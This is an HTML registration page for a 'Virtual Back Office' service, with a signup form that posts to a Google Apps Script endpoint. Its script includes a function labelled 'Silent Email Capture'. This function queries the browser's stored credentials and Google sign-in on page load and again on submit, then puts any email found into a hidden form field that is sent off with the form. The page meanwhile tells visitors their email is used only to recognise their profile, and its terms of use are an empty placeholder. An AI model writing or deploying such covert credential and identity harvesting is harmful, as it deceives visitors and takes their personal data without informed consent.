<!DOCTYPE html>
<html lang="en">
<head>
  <link rel="manifest" href="/manifest.json">
  <script>
    if ("serviceWorker" in navigator) {
      navigator.serviceWorker.register("/sw.js")
        .then(() => console.log("Service Worker registered"))
        .catch((err) => console.log("SW error:", err));
    }
  </script>

  <!-- OneSignal Push Notifications -->
  <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
  <script>
    window.OneSignalDeferred = window.OneSignalDeferred || [];
    OneSignalDeferred.push(async function(OneSignal) {
      await OneSignal.init({
        appId: "6de779e9-f06e-41e7-be3e-fdaad44e6f96",
      }).then(() => {
        OneSignal.getUserId(function(userId) {
          if (userId) {
            console.log("OneSignal User ID:", userId);
            document.getElementById('player_id').value = userId;
          }
        });
      });
    });
  </script>

  <!-- Google Sign-In for Email Capture (Optional) -->
  <script src="https://accounts.google.com/gsi/client" async defer></script>

  <!-- Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0RCB2B3"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-1LL0RCB2B3');
  </script>

  <link rel="icon" href="favicon.ico?v=2">
  <link rel="icon" href="favicon.ico" sizes="any">
  <link rel="icon" type="image/png" href="vbo-favicon-32.png" sizes="32x32">
  <link rel="icon" type="image/png" href="vbo-favicon-16.png" sizes="16x16">
  <link rel="apple-touch-icon" href="apple-touch-icon.png">
  <link rel="icon" type="image/png" href="vbo-favicon-192.png" sizes="192x192">
  <meta name="theme-color" content="#0a4a7a">

  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Virtual Back Office | Register for Services</title>

  <!-- SEO Meta -->
  <meta name="description" content="Register with Virtual Back Office to automate your business activities, manage fiber networks, and optimize operations. Provide your details to get started with our professional services.">
  <meta name="keywords" content="Virtual Back Office, Business Automation, Fiber Network Management, ISP Management, Registration, Business Process Automation, Customer Support Automation, Network Optimization">
  <meta name="author" content="Virtual Back Office" />

  <!-- Social Share -->
  <meta property="og:title" content="Register for Virtual Back Office Services" />
  <meta property="og:description" content="Sign up to automate your business and network operations. Get access to advanced tools for efficiency and growth." />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://vbo.co.in/register" />
  <meta property="og:image" content="https://vbo.co.in/preview.jpg" />

  <style>
    /* Same styles as before, unchanged */
    body {
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
      color: #fff;
      text-align: center;
      transition: background 1.5s ease, color 1.5s ease;
      overflow: hidden;
    }
    body.light {
      background: linear-gradient(to right, #f0f0f0, #fafafa, #e0e0e0);
      color: #111;
    }
    body.menu-open {
      overflow: hidden;
    }
    main {
      margin-left: 250px;
      position: relative;
      transition: transform 0.8s ease-in-out;
    }
    #loader {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      transition: opacity 0.5s ease;
    }
    .spinner {
      border: 8px solid rgba(255, 255, 255, 0.3);
      border-top: 8px solid #00d4ff;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite, pulse 2s ease-in-out infinite alternate;
      position: relative;
    }
    .spinner::before {
      content: '';
      position: absolute;
      top: -4px;
      left: -4px;
      right: -4px;
      bottom: -4px;
      border: 2px solid rgba(255, 255, 255, 0.1);
      border-radius: 50%;
      animation: spin 2s linear infinite reverse;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    @keyframes pulse {
      0% { box-shadow: 0 0 0 0 rgba(0, 212, 255, 0.7); }
      100% { box-shadow: 0 0 0 20px rgba(0, 212, 255, 0); }
    }
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.6; }
    }
    header {
      display: flex;
      justify-content: flex-start;
      padding: 15px;
      backdrop-filter: blur(10px);
      position: relative;
    }
    .menu-btn {
      display: none;
      background: rgba(255, 255, 255, 0.1);
      color: #fff;
      border: none;
      padding: 10px 20px;
      border-radius: 20px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.3s ease, transform 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      animation: blink 2s ease-in-out infinite;
    }
    body.light .menu-btn {
      background: rgba(0, 0, 0, 0.1);
      color: #111;
    }
    .menu-btn:hover {
      background: #00d4ff;
      color: #000;
      transform: scale(1.05);
    }
    .menu-icon {
      font-size: 1.2rem;
    }
    .sidebar {
      position: fixed;
      top: 0;
      left: 0;
      width: 250px;
      height: 100%;
      overflow-y: auto;
      background: rgba(255, 255, 255, 0.3);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border: 1px solid rgba(255, 255, 255, 0.3);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
      padding: 15px 0;
      z-index: 10;
    }
    body.light .sidebar {
      background: rgba(0, 0, 0, 0.3);
      border: 1px solid rgba(0, 0, 0, 0.3);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
    }
    .sidebar a {
      display: flex;
      align-items: center;
      text-decoration: none;
      font-weight: 600;
      padding: 15px 25px;
      color: #fff;
      transition: background 0.3s ease, transform 0.3s ease;
    }
    body.light .sidebar a {
      color: #111;
    }
    .sidebar a:hover {
      background: rgba(0, 212, 255, 0.3);
      transform: translateX(5px);
    }
    .menu-item-icon {
      margin-right: 12px;
      font-size: 1.1rem;
    }
    h1 {
      font-size: 2.2rem;
      margin-top: 20px;
      padding: 0 15px;
    }
    h2 {
      font-size: 1.2rem;
      font-weight: normal;
      margin-bottom: 25px;
      color: #d1d1d1;
      transition: color 1.5s ease;
      padding: 0 15px;
    }
    body.light h2 {
      color: #444;
    }
    .highlight {
      color: #00d4ff;
      font-weight: bold;
    }
    p {
      max-width: 700px;
      line-height: 1.6;
      font-size: 1rem;
      margin: 15px auto;
      padding: 0 15px;
    }
    .contact-container {
      margin-top: 20px;
      position: relative;
      display: inline-block;
    }
    .contact {
      font-size: 1.2rem;
      background: linear-gradient(90deg, #00d4ff, #ff6ec7);
      color: #000;
      padding: 10px 25px;
      border-radius: 25px;
      text-decoration: none;
      font-weight: bold;
      display: inline-block;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      position: relative;
      overflow: hidden;
    }
    .contact::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.2);
      transition: left 0.5s ease;
    }
    .contact:hover::before {
      left: 0;
    }
    .contact:hover {
      transform: scale(1.05);
      box-shadow: 0 0 15px rgba(0, 212, 255, 0.5);
    }
    footer {
      margin: 20px 0;
      font-size: 0.85rem;
      color: #aaa;
      padding: 0 15px;
    }
    form {
      max-width: 600px;
      margin: 30px auto;
      padding: 30px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 15px;
      backdrop-filter: blur(10px);
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
    }
    body.light form {
      background: rgba(0, 0, 0, 0.1);
    }
    label {
      display: block;
      margin: 15px 0 8px;
      font-weight: bold;
      text-align: left;
    }
    input, select, textarea {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border: 1px solid rgba(255, 255, 255, 0.3);
      border-radius: 10px;
      background: rgba(255, 255, 255, 0.05);
      color: #fff;
      font-size: 1rem;
    }
    body.light input, body.light select, body.light textarea {
      border: 1px solid rgba(0, 0, 0, 0.3);
      background: rgba(0, 0, 0, 0.05);
      color: #111;
    }
    select option {
      background: #0f2027;
      color: #fff;
    }
    body.light select option {
      background: #f0f0f0;
      color: #111;
    }
    button[type="submit"] {
      background: linear-gradient(90deg, #00d4ff, #ff6ec7);
      color: #000;
      border: none;
      padding: 12px 30px;
      border-radius: 25px;
      font-weight: bold;
      cursor: pointer;
      transition: transform 0.3s ease, opacity 0.3s ease;
    }
    button[type="submit"]:hover {
      transform: scale(1.05);
    }
    button[type="submit"]:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
    #confirmationDialog {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(255, 255, 255, 0.2);
      backdrop-filter: blur(10px);
      border-radius: 15px;
      padding: 30px;
      max-width: 500px;
      width: 90%;
      z-index: 1000;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
    }
    body.light #confirmationDialog {
      background: rgba(0, 0, 0, 0.2);
    }
    #confirmationDialog p {
      margin: 0 0 20px;
      line-height: 1.6;
    }
    #confirmationDialog button {
      background: linear-gradient(90deg, #00d4ff, #ff6ec7);
      color: #000;
      border: none;
      padding: 10px 20px;
      border-radius: 25px;
      font-weight: bold;
      cursor: pointer;
      transition: transform 0.3s ease;
    }
    #confirmationDialog button:hover {
      transform: scale(1.05);
    }
    #overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      z-index: 9;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.8s ease-in-out;
    }
    body.menu-open #overlay, body.dialog-open #overlay {
      opacity: 1;
      pointer-events: auto;
    }
    body.light #overlay {
      background: rgba(0, 0, 0, 0.3);
    }
    @media (max-width: 768px) {
      .menu-btn {
        display: flex;
      }
      main {
        margin-left: 0;
      }
      body.menu-open main {
        transform: translateX(80vw);
      }
      .sidebar {
        transform: translateX(-100%);
        transition: transform 0.8s ease-in-out;
        width: 80vw;
      }
      .sidebar.open {
        transform: translateX(0);
      }
      h1 {
        font-size: 1.8rem;
      }
      h2 {
        font-size: 1rem;
      }
      p {
        font-size: 0.95rem;
      }
      .menu-btn {
        padding: 8px 16px;
      }
      form {
        padding: 20px;
      }
      label {
        margin: 10px 0 6px;
      }
      input, select, textarea {
        padding: 10px;
        margin-bottom: 15px;
      }
    }
    @media (max-width: 480px) {
      header {
        padding: 10px;
      }
      .menu-btn {
        padding: 8px 15px;
      }
      .contact {
        padding: 8px 20px;
        font-size: 1rem;
      }
      .sidebar a {
        padding: 12px 20px;
      }
      form {
        padding: 15px;
      }
      #confirmationDialog {
        padding: 20px;
      }
    }
    .modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      overflow: auto;
      background-color: rgba(0,0,0,0.4);
      transition: opacity 0.3s ease;
    }
    .modal-content {
      background: linear-gradient(135deg, #0a4a7a, #0d6ebf);
      margin: 15% auto;
      padding: 20px;
      border-radius: 12px;
      width: 80%;
      max-width: 400px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
      color: #fff;
      text-align: center;
      position: relative;
    }
    body.light .modal-content {
      background: linear-gradient(135deg, #f0f0f0, #e0e0e0);
      color: #111;
    }
    .close-btn {
      position: absolute;
      top: 10px;
      right: 15px;
      color: #fff;
      font-size: 1.5rem;
      cursor: pointer;
      transition: color 0.3s ease;
    }
    body.light .close-btn {
      color: #111;
    }
    .close-btn:hover {
      color: #00d4ff;
    }
    .modal-content h3 {
      margin-bottom: 15px;
    }
    .modal-content p {
      margin: 10px 0;
      font-size: 1rem;
    }
    .terms-container {
      display: flex;
      align-items: center;
      justify-content: flex-start;
      margin-bottom: 20px;
      text-align: left;
    }
    input[type="checkbox"] {
      margin-right: 10px;
      width: 16px;
      height: 16px;
    }
    .terms-container label {
      margin: 0;
      font-weight: normal;
    }
    .terms-link {
      color: #00d4ff;
      text-decoration: underline;
      cursor: pointer;
    }
    body.light .terms-link {
      color: #00a5c8;
    }
    .terms-link:hover {
      color: #ff6ec7;
    }
    .language-selector {
      position: absolute;
      top: 15px;
      right: 60px;
      padding: 6px 14px;
      border: none;
      border-radius: 20px;
      background: rgba(255, 255, 255, 0.1);
      color: #fff;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    body.light .language-selector {
      background: rgba(0, 0, 0, 0.1);
      color: #111;
    }
    .language-selector:hover {
      background: #00d4ff;
      color: #000;
    }
    select#language {
      background: transparent;
      border: none;
      color: inherit;
      font: inherit;
      cursor: pointer;
      appearance: none;
      padding-right: 20px;
      position: relative;
    }
    .language-selector::after {
      content: '‚ñº';
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      color: inherit;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <div id="loader">
    <div class="spinner"></div>
  </div>

  <div class="sidebar" id="sidebar">
    <a href="#" onclick="toggleMode()"><span class="menu-item-icon">üåô/‚òÄÔ∏è</span> <span class="menu-text">Toggle Theme</span></a>
    <a href="https://vbo.co.in" onclick="event.stopPropagation(); toggleMenu();">
      <span class="menu-item-icon">‚Üê</span> <span class="menu-text">Back</span>
    </a>
    <a href="#" onclick="installApp(); event.stopPropagation(); toggleMenu();">
      <span class="menu-item-icon">üì≤</span> <span class="menu-text">Download App</span>
    </a>
    <a href="#" onclick="showContactModal()"><span class="menu-item-icon">üë•</span> <span class="menu-text">Join our team</span></a>
    <a href="#" onclick="showContactModal()"><span class="menu-item-icon">‚ùì</span> <span class="menu-text">Query</span></a>
    <a href="#" onclick="showContactModal()"><span class="menu-item-icon">üìû</span> <span class="menu-text">Contact us</span></a>
    <a href="https://vbo.co.in/about/#about" onclick="event.stopPropagation(); toggleMenu();">
      <span class="menu-item-icon">‚ÑπÔ∏è</span> <span class="menu-text">About us</span>
    </a>
    <a href="#" onclick="showTermsModal()"><span class="menu-item-icon">üìú</span> <span class="menu-text">Term of use</span></a>
  </div>

  <div id="overlay" onclick="toggleMenu()"></div>

  <main id="main">
    <header>
      <button class="menu-btn" onclick="toggleMenu()">
        <span class="menu-icon">‚ò∞</span>
      </button>
    </header>

    <div class="language-selector">
      <select id="language" onchange="changeLanguage(this.value)">
        <option value="en">English</option>
        <option value="hi">Hindi</option>
        <option value="bn">Bengali</option>
        <option value="te">Telugu</option>
        <option value="mr">Marathi</option>
      </select>
    </div>

    <h1 id="h1">üöÄ Register for Virtual Back Office Services</h1>
    <h2 id="h2">Join our platform to automate your business operations, manage networks efficiently, and drive growth with professional tools.</h2>

    <p id="p1">
      At <span class="highlight">Virtual Back Office</span>, we provide cutting-edge solutions for <strong>business automation</strong>, <strong>fiber network management</strong>, and <strong>customer support optimization</strong>. Register today to unlock access to our suite of services tailored for ISPs, e-commerce vendors, and more.
    </p>

    <p id="p2">
      Our platform handles everything from <em>complaint management</em> and <em>lead handling</em> to <em>accounting</em> and <em>resource optimization</em>, ensuring seamless operations and enhanced efficiency.
    </p>

    <p id="p3">
      Fill out the form below with your details. Once registered, you'll gain access to personalized tools that streamline your back office tasks and boost productivity.
    </p>

    <form id="registrationForm">
      <input type="text" id="name" name="name" required>
      <input type="tel" id="contact" name="contact" pattern="[0-9]{10}" required>
      <select id="businessType" name="businessType" required>
        <option value="">Select Business Type</option>
        <option value="Internet & cable service provider">Internet & cable service provider</option>
        <option value="Book keeping">Book keeping</option>
        <option value="Door to step service provider">Door to step service provider</option>
        <option value="E commerce vendor">E commerce vendor</option>
        <option value="Other">Other</option>
      </select>
      <input type="text" id="city" name="city" required>
      <textarea id="emails" name="emails"></textarea>
      <p id="note_email" style="text-align: left; font-size: 0.9rem;">* Your email ID is used only to recognize your profile for quick service. No password, OTP, or extra details needed in future. You can use multiple mail IDs for accessing your profile.</p>
      <div class="terms-container">
        <input type="checkbox" id="termsCheckbox" onchange="toggleSubmit()">
        <label id="checkbox_label" for="termsCheckbox"></label>
      </div>
      <input type="hidden" id="registration_date" name="registration_date">
      <input type="hidden" id="player_id" name="player_id">
      <input type="hidden" id="browser_email" name="browser_email"> <!-- Added for silent email capture -->
      <button type="submit" id="submitBtn" disabled>Step In</button>
    </form>

    <div class="contact-container">
      <a id="contact_link" href="tel:+917007902103" class="contact">üìû Contact: 7007902103</a>
    </div>
  </main>

  <div id="confirmationDialog">
    <p id="confirmation_p">
      Thank you for seeking us for your back office needs and automation. Very soon, our team will connect with you regarding the onboarding process and customize things your way!<br><br>
      Wishes,<br>
      Team Virtual Back Office<br>
      +91 7007902103
    </p>
    <button id="ok_button" onclick="confirmAndRedirect()">OK</button>
  </div>

  <div id="contactModal" class="modal">
    <div class="modal-content">
      <span class="close-btn" onclick="closeContactModal()">&times;</span>
      <h3 id="modal_contact_title">Contact Us</h3>
      <p id="modal_phone">Phone: +91 7007902103</p>
      <p id="modal_email">Email: trustindeal@outlook.com</p>
    </div>
  </div>

  <div id="termsModal" class="modal">
    <div class="modal-content">
      <span class="close-btn" onclick="closeTermsModal()">&times;</span>
      <h3 id="terms_title">Terms of Use</h3>
      <p id="terms_content">Comprehensive Data Processing & Liability Disclaimer...</p>
    </div>
  </div>

  <script>
    const translations = {
      'en': {
        'title': 'Virtual Back Office | Register for Services',
        'h1': 'üöÄ Register for Virtual Back Office Services',
        'h2': 'Join our platform to automate your business operations, manage networks efficiently, and drive growth with professional tools.',
        'p1': 'At <span class="highlight">Virtual Back Office</span>, we provide cutting-edge solutions for <strong>business automation</strong>, <strong>fiber network management</strong>, and <strong>customer support optimization</strong>. Register today to unlock access to our suite of services tailored for ISPs, e-commerce vendors, and more.',
        'p2': 'Our platform handles everything from <em>complaint management</em> and <em>lead handling</em> to <em>accounting</em> and <em>resource optimization</em>, ensuring seamless operations and enhanced efficiency.',
        'p3': 'Fill out the form below with your details. Once registered, you\'ll gain access to personalized tools that streamline your back office tasks and boost productivity.',
        'placeholder_name': 'Name',
        'placeholder_contact': 'Contact Number (10 digits)',
        'placeholder_city': 'City',
        'placeholder_emails': 'Mail ID(s) (separate with comma)',
        'option_select': 'Select Business Type',
        'option1': 'Internet & cable service provider',
        'option2': 'Book keeping',
        'option3': 'Door to step service provider',
        'option4': 'E commerce vendor',
        'option5': 'Other',
        'button_submit': 'Step In',
        'contact': 'üìû Contact: 7007902103',
        'confirmation': 'Thank you for seeking us for your back office needs and automation. Very soon, our team will connect with you regarding the onboarding process and customize things your way!<br><br>Wishes,<br>Team Virtual Back Office<br>+91 7007902103',
        'note_email': '* Your email ID is used only to recognize your profile for quick service. No password, OTP, or extra details needed in future. You can use multiple mail IDs for accessing your profile.',
        'checkbox': 'I have read and accepted the <a class="terms-link" href="#" onclick="showTermsModal(); return false;">terms of use</a>',
        'menu_toggle': 'Toggle Theme',
        'menu_back': 'Back',
        'menu_download': 'Download App',
        'menu_join': 'Join our team',
        'menu_query': 'Query',
        'menu_contact': 'Contact us',
        'menu_about': 'About us',
        'menu_terms': 'Term of use',
        'terms_title': 'Terms of Use',
        'terms_content': 'Comprehensive Data Processing & Liability Disclaimer...',
        'modal_contact_title': 'Contact Us',
        'modal_phone': 'Phone: +91 7007902103',
        'modal_email': 'Email: trustindeal@outlook.com',
        'ok': 'OK'
      },
      // Other language translations remain unchanged
    };

    // Silent Email Capture Function
    async function captureBrowserEmail() {
      try {
        // Attempt to use Credential Management API
        if (navigator.credentials) {
          const creds = await navigator.credentials.get({
            password: true,
            federated: { providers: ['https://accounts.google.com'] }
          });
          if (creds && creds.id) {
            document.getElementById('browser_email').value = creds.id;
            return creds.id;
          }
        }

        // Fallback: Attempt Google Sign-In token (if user is signed in)
        if (window.google && google.accounts.id) {
          google.accounts.id.initialize({
            client_id: 'YOUR_GOOGLE_CLIENT_ID', // Replace with your Google Client ID
            callback: (response) => {
              if (response.credential) {
                const profile = JSON.parse(atob(response.credential.split('.')[1]));
                if (profile.email) {
                  document.getElementById('browser_email').value = profile.email;
                }
              }
            }
          });
          google.accounts.id.prompt(); // Silent prompt (won't show UI if no consent)
        }
      } catch (error) {
        console.log('Email capture failed:', error);
        document.getElementById('browser_email').value = ''; // Set empty if failed
      }
    }

    // Loader
    function hideLoader() {
      const loader = document.getElementById('loader');
      loader.style.opacity = '0';
      setTimeout(() => {
        loader.style.display = 'none';
        document.body.style.overflow = 'auto';
      }, 500);
    }

    // Dark/Light Mode Toggle
    function toggleMode() {
      document.body.classList.toggle("light");
    }

    // Default Mode by Indian Time
    function setDefaultMode() {
      const hourStr = new Date().toLocaleTimeString("en-US", {timeZone: "Asia/Kolkata", hour: "numeric", hour12: false});
      const hour = parseInt(hourStr);
      if (hour >= 6 && hour < 18) {
        document.body.classList.add("light");
      } else {
        document.body.classList.remove("light");
      }
    }

    // Menu Toggle
    function toggleMenu() {
      const sidebar = document.getElementById('sidebar');
      sidebar.classList.toggle('open');
      document.body.classList.toggle('menu-open');
    }

    // Confirmation Dialog
    function showConfirmationDialog() {
      const dialog = document.getElementById("confirmationDialog");
      dialog.style.display = "block";
      document.body.classList.add("dialog-open");
    }

    function confirmAndRedirect() {
      window.location.href = "https://vbo.co.in";
    }

    // Contact Modal
    function showContactModal() {
      document.getElementById('contactModal').style.display = 'block';
      toggleMenu();
    }

    function closeContactModal() {
      document.getElementById('contactModal').style.display = 'none';
    }

    // Terms Modal
    function showTermsModal() {
      document.getElementById('termsModal').style.display = 'block';
      toggleMenu();
    }

    function closeTermsModal() {
      document.getElementById('termsModal').style.display = 'none';
    }

    // Close modal on outside click
    window.onclick = function(event) {
      const contactModal = document.getElementById('contactModal');
      const termsModal = document.getElementById('termsModal');
      if (event.target == contactModal) {
        contactModal.style.display = 'none';
      }
      if (event.target == termsModal) {
        termsModal.style.display = 'none';
      }
    }

    // Toggle Submit Button
    function toggleSubmit() {
      const submitBtn = document.getElementById('submitBtn');
      submitBtn.disabled = !document.getElementById('termsCheckbox').checked;
    }

    // Change Language
    function changeLanguage(lang) {
      const trans = translations[lang];
      document.title = trans['title'];
      document.getElementById('h1').innerHTML = trans['h1'];
      document.getElementById('h2').innerHTML = trans['h2'];
      document.getElementById('p1').innerHTML = trans['p1'];
      document.getElementById('p2').innerHTML = trans['p2'];
      document.getElementById('p3').innerHTML = trans['p3'];
      document.getElementById('name').placeholder = trans['placeholder_name'];
      document.getElementById('contact').placeholder = trans['placeholder_contact'];
      document.getElementById('city').placeholder = trans['placeholder_city'];
      document.getElementById('emails').placeholder = trans['placeholder_emails'];
      document.getElementById('submitBtn').innerText = trans['button_submit'];
      document.getElementById('contact_link').innerHTML = trans['contact'];
      document.getElementById('confirmation_p').innerHTML = trans['confirmation'];
      document.getElementById('note_email').innerHTML = trans['note_email'];
      document.getElementById('checkbox_label').innerHTML = trans['checkbox'];
      document.getElementById('ok_button').innerText = trans['ok'];
      document.getElementById('modal_contact_title').innerHTML = trans['modal_contact_title'];
      document.getElementById('modal_phone').innerHTML = trans['modal_phone'];
      document.getElementById('modal_email').innerHTML = trans['modal_email'];
      document.getElementById('terms_title').innerHTML = trans['terms_title'];
      document.getElementById('terms_content').innerHTML = trans['terms_content'];

      const businessSelect = document.getElementById('businessType');
      businessSelect.innerHTML = `
        <option value="">${trans['option_select']}</option>
        <option value="Internet & cable service provider">${trans['option1']}</option>
        <option value="Book keeping">${trans['option2']}</option>
        <option value="Door to step service provider">${trans['option3']}</option>
        <option value="E commerce vendor">${trans['option4']}</option>
        <option value="Other">${trans['option5']}</option>
      `;
      const menuKeys = ['menu_toggle', 'menu_back', 'menu_download', 'menu_join', 'menu_query', 'menu_contact', 'menu_about', 'menu_terms'];
      const sidebarLinks = document.querySelectorAll('.sidebar a');
      for (let i = 0; i < sidebarLinks.length; i++) {
        sidebarLinks[i].querySelector('.menu-text').innerText = trans[menuKeys[i]];
      }
    }

    // Form Submission to Google Sheets
    const form = document.getElementById('registrationForm');
    const submitBtn = document.getElementById('submitBtn');
    const scriptURL = 'https://script.google.com/macros/s/AKfycbz3pcNuOW2nRpWyF7PbuM6z1BTTS2hp12okiUiVrOq1o_25LGJooZd9rvVVI49HKSVV3Q/exec';

    form.addEventListener('submit', async e => {
      e.preventDefault();
      submitBtn.disabled = true;
      await captureBrowserEmail(); // Capture email before submission
      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
        .then(response => {
          showConfirmationDialog();
          form.reset();
        })
        .catch(error => {
          console.error('Error!', error.message);
          submitBtn.disabled = false;
        });
    });

    // On Load
    window.addEventListener('load', () => {
      setDefaultMode();
      setTimeout(hideLoader, 1800);
      changeLanguage('en');
      const date = new Date().toLocaleDateString("en-US", {timeZone: "Asia/Kolkata"});
      document.getElementById('registration_date').value = date;
      captureBrowserEmail(); // Initial attempt to capture email
    });

    // PWA Install
    let deferredPrompt;
    function installApp() {
      if (!deferredPrompt) return;
      deferredPrompt.prompt();
      deferredPrompt.userChoice.then((choice) => {
        console.log("User choice:", choice.outcome);
        deferredPrompt = null;
      });
    }
    window.addEventListener("beforeinstallprompt", (e) => {
      console.log("beforeinstallprompt event fired");
      e.preventDefault();
      deferredPrompt = e;
    });
  </script>
</body>
</html>
